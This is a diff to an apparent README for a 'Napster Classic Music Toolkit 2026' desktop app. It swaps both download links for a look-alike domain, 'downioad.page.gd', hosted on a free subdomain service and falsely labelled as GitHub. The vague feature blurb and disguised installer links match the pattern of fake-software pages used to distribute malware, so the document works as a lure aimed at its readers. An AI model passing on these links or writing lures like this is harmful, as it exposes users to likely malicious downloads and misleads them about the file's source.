@@ -2,7 +2,7 @@
 
 Napster Classic Music Toolkit 2026 is a dedicated desktop application designed to bring back the essence of Napster with modern enhancements. This toolkit allows users to manage their music libraries, create personalized playlists, and enjoy offline listening with ease. Whether you're a long-time fan or new to music management, this tool offers a seamless experience on Windows.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Features
 
@@ -54,7 +54,7 @@ Updates are periodically released. To update, simply download the latest version
 
 To get the latest version, visit the download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Last Updated
 
